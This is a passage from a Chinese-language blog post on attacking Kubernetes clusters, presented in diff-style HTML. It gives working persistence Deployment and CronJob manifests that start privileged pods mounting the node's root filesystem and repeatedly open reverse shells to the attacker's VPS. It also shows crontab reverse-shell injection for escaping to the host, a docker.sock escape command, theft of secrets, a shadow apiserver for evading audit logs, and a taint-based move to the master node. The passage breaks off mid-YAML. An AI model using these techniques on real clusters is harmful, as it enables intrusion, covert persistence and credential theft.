+</span></span><span style="display:flex;"><span>curl -sk --header <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> --cacert $CA_CERT -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -X POST https://x.x.x.x:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d <span style="color:#e6db74">&#39;{&#34;kind&#34;:&#34;SelfSubjectRulesReview&#34;,&#34;apiVersion&#34;:&#34;authorization.k8s.io/v1&#34;,&#34;spec&#34;:{&#34;namespace&#34;:&#34;default&#34;}}&#39;</span>
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755339078336.png" alt="QQ_1755339078336"></p>
+<p>如果返回的json中列出来是较高的权限，我们可以使用这个服务账户的token来远程控制apiserver（网传可以curl请求apiserver的借口来执行命令，但我失败了，似乎是因为这里不能使用常规http来请求借口，而需要SPDY或者websocket，所以我认为使用kubectl来完成对kubectl的控制更方便）：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755343454008.png" alt="QQ_1755343454008"></p>
+<p>那么后面的操作就和上文一样，可以创建后门pod并挂载node根目录实现对node节点的访问或者逃逸（逃逸在后面的文章总结）</p>
+<h3 id="未开启rbac权限">未开启RBAC权限</h3>
+<p>RBAC(Role-Based Access Control)是k8s中用于控制访问权限的一种策略，它允许管理员定义角色和角色绑定，以及分配这些角色给用户或服务账号，以此来限制他们对集群的访问和操作权限</p>
+<p>我们可以通过在master节点上执行命令，查看apiserver的启动参数是否有<code>--authorization-mode=RBAC</code>，以此查看是否开启了RBAC权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization-mode
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755358930320.png" alt="QQ_1755358930320"></p>
+<p>或者：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ps -ef | grep authorization-mode
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755359606268.png" alt="QQ_1755359606268"></p>
+<p>只要有这个参数，则代表开启了RBAC权限</p>
+<p>如果没有开启RBAC权限，代表我们可以使用k8s中任意经过认证的token实现对k8s apiserver的控制，那么思路就和上面连接API server执行是一样的了，当我们获得了pod的shell，可以尝试读取<code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>获得token，然后直接使用curl或者kubectl调用apiserver，创建后门pod并逃逸来控制节点</p>
+<h3 id="不安全的容器镜像">不安全的容器镜像</h3>
+<p>如果容器本身存在漏洞，则很容易成为入口点，比如笔者遇到过的一个攻防场景，pod上运行的zabbix在公网存在弱口令，进入后台可以RCE导致pod被接管，后续进行一系列横向和逃逸，成功接管了整个k8s</p>
+<h3 id="总结-1">总结</h3>
+<p>从上面的这些方法来看，执行这一步的目标就利用传统安全漏洞、token、apiserver原有命令等手段，在pod上实现命令执行或者能够获得apiserver的控制权，为接下来的权限提升（即逃逸）做准备</p>
+<h2 id="3持久化">3.持久化</h2>
+<p>持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权</p>
+<h3 id="部署后门容器">部署后门容器</h3>
+<p>在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）</p>
+<p>常见方法如下</p>
+<h4 id="挂载目录">挂载目录</h4>
+<p>向创建的pod中挂载一些用于逃逸的目录，在后面权限提升部分的笔记中详细记录了</p>
+<p>这里值得一提的是，我们可以在yaml中使用这个配置：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
+</span></span></code></pre></div><p>可以让pod在被关闭后重启</p>
+<h4 id="使用k8s控制器部署后门容器">使用k8s控制器部署后门容器</h4>
+<p>在前面执行部分的笔记中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span></code></pre></div><p>这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">test-rev</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">test-rev</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#e6db74">&#34;-c&#34;</span>
+</span></span><span style="display:flex;"><span>          - |<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            bash -c &#39;while true; do bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1; sleep 60; done&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">securityContext</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span></code></pre></div><p>指定yaml文件即可创建：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757005961855.png" alt="QQ_1757005961855"></p>
+<p>可以通过如下命令可以查看我们部署的控制器：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl get deployments
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006424193.png" alt="QQ_1757006424193"></p>
+<p>通过deployment部署的pod即使被删除也能自动重建：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006371754.png" alt="QQ_1757006371754"></p>
+<p>如果要删除这个控制器，命令如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl delete deployment test-rev
+</span></span></code></pre></div><h4 id="cronjob持久化">cronjob持久化</h4>
+<p>cronjob的作用类似于linux上的crontab，会创建基于时间间隔重复的调度job</p>
+<p>job控制器也是k8s的一种内置控制器，用于运行一个或多个Pod来执行任务，yaml文件格式如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">batch/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">CronJob</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev-cron</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">schedule</span>: <span style="color:#e6db74">&#34;*/1 * * * *&#34;</span>   <span style="color:#75715e"># 每分钟执行一次</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">jobTemplate</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">template</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Never</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>              - <span style="color:#e6db74">&#34;-c&#34;</span>
+</span></span><span style="display:flex;"><span>              - |<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">securityContext</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span></code></pre></div><p>创建方法也是一样的：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130951640.png" alt="QQ_1757130951640"></p>
+<p>创建后可以查看是否创建成功：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl --kubeconfig config get cronjob -A
+</span></span></code></pre></div><p>创建后就可以每分钟收到一次反弹shell：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130993297.png" alt="QQ_1757130993297"></p>
+<p>删除也很简单：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl delete cronjob test-rev-cron
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757131261273.png" alt="QQ_1757131261273"></p>
+<h3 id="在容器镜像内植入后门">在容器/镜像内植入后门</h3>
+<h4 id="容器植入后门">容器植入后门</h4>
+<p>这里的即对pod容器进行一些基础的维持，方法和常规linux权限维持相似，这里不再赘述</p>
+<h4 id="向镜像植入后门">向镜像植入后门</h4>
+<p>如果获取了私有镜像仓库的控制权限，我们便可以尝试向镜像注入恶意代码，常见的方法是修改dockerfile文件，在里面植入恶意的sh命令</p>
+<h3 id="修改核心文件访问权限">修改核心文件访问权限</h3>
+<p>当我们获得了master节点的权限后，也可以通过修改apiserver配置文件来修改组件的访问权限，常用方式如下：</p>
+<ul>
+<li>开启apiserver不安全端口或安全端口匿名访问</li>
+<li>配置kubelet 10250端口未授权访问</li>
+<li>配置etcd未授权</li>
+<li>配置kube proxy apiserver监听其他端口</li>
+</ul>
+<h3 id="伪装系统pod">伪装系统Pod</h3>
+<p>kube-system是k8s系统相关的所有对象组成的命名空间，包含很多用于管理集群的组件：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757144377550.png" alt="QQ_1757144377550"></p>
+<p>一般来说这些组件是不会被查看和修改的，所以我们可以在这里面伪造一个系统pod，pod创建的方法和前面一样，只是名字和指定的namespace不同，这里不再赘述</p>
+<h3 id="部署静态pod">部署静态pod</h3>
+<p>static 是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：</p>
+<ul>
+<li>
+<p>仅依赖于 kubelet：Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用，在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器宿主机节点之上</p>
+</li>
+<li>
+<p>配置目录固定：Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为  /etc/kubernetes/manifests 或  /etc/kubelet.d/，一般情况不做更改。需要注意的是，不同Kubernetes发行版的默认路径可能有所不同，建议在实际环境中进行确认</p>
+</li>
+</ul>
+<p>我们只需要在配置目录如<code>/etc/kubernetes/manifests</code>中添加恶意pod的yaml文件即可</p>
+<p>我们可以查看<code>/etc/systemd/system/kubelet.service.d/10-config.conf</code>中是否有这个配置：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757146611800.png" alt="QQ_1757146611800"></p>
+<p>没有配置我们可以手动启动这个配置：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubelet --pod-manifest-path<span style="color:#f92672">=</span>/etc/kubernetes/manifests
+</span></span></code></pre></div><p>或在上面截图中的<code>/var/lib/kubelet/config.yaml</code>文件中添加一行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">staticPodPath</span>: <span style="color:#ae81ff">/etc/kubernetes/manifests</span>
+</span></span></code></pre></div><h3 id="创建shadow-apiserver">创建shadow apiserver</h3>
+<p>思路是创建一个具有apiserver功能的pod，后续命令可以在这个影子apiserver上进行下发，可以绕过k8s的日志审计，不会被原apiserver记录，更加隐蔽</p>
+<p>我们可以使用CDK实现，可以看原wiki：https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./cdk run k8s-shadow-apiserver default
+</span></span></code></pre></div><p>shadow apiserver会开启未授权端口，部署完成后我们可以通过kubectl或cdk的kcurl向shadow apiserver下发请求</p>
+<h3 id="k0otkit">k0otkit</h3>
+<p>绿盟的阮博男师傅分享了一种k8s内的rootkit技术：https://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/</p>
+<p>从攻击者的角度来看，k0otkit利用了多种技术和天然优势：</p>
+<ol>
+<li>DaemonSet和Secret资源（快速持续反弹、资源分离）</li>
+<li>kube-proxy镜像（就地取材）</li>
+<li>动态容器注入（高隐蔽性）</li>
+<li>Meterpreter（流量加密、持续反弹）</li>
+<li>无文件攻击（高隐蔽性）</li>
+</ol>
+<p>这个rootkit除了用于权限维持以外，在我们获得master节点的cluster-admin权限也可以用来快速获取所有节点shell，具体的使用方法可以参考github：https://github.com/Metarget/k0otkit</p>
+<h2 id="4权限提升">4.权限提升</h2>
+<p>一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。</p>
+<h3 id="rbac权限滥用">RBAC权限滥用</h3>
+<p>类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务</p>
+<h3 id="部署静态pod-1">部署静态pod</h3>
+<p>这个方法在前面持久化的笔记中已经介绍过了，这里不再赘述</p>
+<h3 id="利用容器不安全配置提权">利用容器不安全配置提权</h3>
+<p>即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别</p>
+<h4 id="挂载目录逃逸">挂载目录逃逸</h4>
+<p>挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接参考docker逃逸的手法，在我的这篇文章提到过：<a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a> ，这里提一个最简单的挂载根目录：</p>
+<p>比如我们创建恶意pod的时候，根目录挂载到了容器的<code>/mnt</code>目录，所以在获取了pod的shell后，我们可以通过查看pod的<code>/mnt</code>目录来访问查看node的根目录：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714003958889.png" alt="QQ_1752337790318"></p>
+<p>接下来可以通过写定时任务来获取node的shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;* * * * * root /bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/&lt;vps的公网IP&gt;/4444 0&gt;&amp;1 &amp; disown  &#39;&#34;</span> &gt;&gt; /mnt/etc/crontab
+</span></span></code></pre></div><blockquote>
+<p>注意，这里并没有直接使用<code>sh -i &gt; /dev/tcp/&lt;IP&gt;/4444 2&gt;&amp;1</code>，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持<code>&gt;&amp;</code>语法，上面的yaml文件中反弹shell的payload同理</p>
+</blockquote>
+<p>我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384892469.png" alt="QQ_1752384892469"></p>
+<p>这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752342324537-20250714004016922.png" alt="QQ_1752342324537"></p>
+<p>不过通过查阅资料发现原因可能和busybox的情况类似，对<code>-i</code>即交互参数支持不完整，那么我们可以尝试使用<code>disown</code>命令让我们反弹shell的进程不受父shell进程影响而exit：</p>
+<pre tabindex="0"><code>echo -e &#34;* * * * * root /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1 &amp; disown&#39;&#34; &gt;&gt; /mnt/etc/crontab
+</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384977729.png" alt="QQ_1752384977729"></p>
+<p>此时我们就可以接收到反弹的shell并且不会断开了：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752344803661-20250714004017953.png" alt="QQ_1752344803661"></p>
+<h4 id="持久化挂载dockersock">持久化挂载docker.sock</h4>
+<p>挂载docker socket逃逸同样在我写的 <a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a> 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v <span style="color:#e6db74">&#34;/proc:/host/proc&#34;</span> -v <span style="color:#e6db74">&#34;/sys:/host/sys&#34;</span> -v <span style="color:#e6db74">&#34;/:/rootfs&#34;</span> --network<span style="color:#f92672">=</span>host --privileged<span style="color:#f92672">=</span>true --cap-add<span style="color:#f92672">=</span>ALL alpine:latest
+</span></span></code></pre></div><h4 id="容器特权逃逸">容器特权逃逸</h4>
+<p>同样在 <a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a> 里详细介绍了，值得一题的是关于特权信息搜集时的小技巧，在前面信息搜集部分已经讲过了</p>
+<h3 id="容器基础应用或容器编排平台漏洞">容器基础应用或容器编排平台漏洞</h3>
+<h4 id="docker漏洞">docker漏洞</h4>
+<p>即docker逃逸的一些历史CVE，基本和docker的runc、containerd等容器相关</p>
+<h4 id="k8s漏洞">k8s漏洞</h4>
+<p>即k8s容器逃逸的一些历史CVE</p>
+<h3 id="利用linux内核漏洞逃逸">利用linux内核漏洞逃逸</h3>
+<p>这个原理在docker逃逸的文章也解释了，就是容器与宿主机共享内核并使用内核功能（比如cgroup和namespace）进行容器和宿主机的隔离，我们可以使用内核提权漏洞来进行逃逸，常见如下：</p>
+<ul>
+<li>CVE-2016-5195 DirtyCow：执行 <code>uname -r</code>，<strong>2.6.22&lt;=内核版本&lt;=4.8.3</strong>时可能存在</li>
+<li>CVE-2020-14386：<strong>4.6&lt;=内核版本&lt;=5.9</strong>时可能存在</li>
+<li>CVE-2022-0847：<strong>内核版本小于5.16.11且不是5.15.25、5.10.102</strong>时可能存在</li>
+</ul>
+<h3 id="总结-2">总结</h3>
+<p>可以看见k8s中权限提升的常见方法就是权限滥用或容器逃逸</p>
+<h2 id="5横向移动">5.横向移动</h2>
+<h3 id="窃取凭证">窃取凭证</h3>
+<h4 id="kubeconfig凭证">kubeconfig凭证</h4>
+<p>kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在前面初始访问部分的笔记中已经介绍了，这里不再说明</p>
+<h4 id="secret对象">secret对象</h4>
+<p>在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubeconfig get secrets -A
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151099118.png" alt="QQ_1757151099118"></p>
+<p>查看指定secret内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl --kubeconfig config -n <span style="color:#f92672">[</span>指定命名空间<span style="color:#f92672">]</span> get secret <span style="color:#f92672">[</span>secret名称<span style="color:#f92672">]</span> -o yaml
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151463832.png" alt="QQ_1757151463832"></p>
+<p>可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了</p>
+<h3 id="集群内网渗透">集群内网渗透</h3>
+<p>K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段</p>
+<h3 id="第三方组件风险">第三方组件风险</h3>
+<p>在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸</p>
+<p>简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群</p>
+<h3 id="污点taint横向">污点（taint）横向</h3>
+<p>这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限</p>
+<p>污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上</p>
+<p>其中污点有三种属性(效果)：</p>
+<blockquote>
+<ol>
+<li><strong>NoSchedule</strong>：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。</li>
+<li><strong>PreferNoSchedule</strong>：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 <code>PreferNoSchedule</code> 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。</li>
+<li><strong>NoExecute</strong>：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，<code>NoExecute</code> 污点会导致 Pod 被终止并迁移到其他节点。</li>
+</ol>
+</blockquote>
+<p>一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点</p>
+<p>比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat &gt; x.yaml <span style="color:#e6db74">&lt;&lt; EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: control-master-x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  tolerations:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - key: &#34;node-role.kubernetes.io/master&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    operator: &#34;Exists&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    effect: &#34;NoSchedule&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: control-master-x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: ubuntu:18.04
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;/bin/sleep&#34;, &#34;3650d&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    volumeMounts:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: master
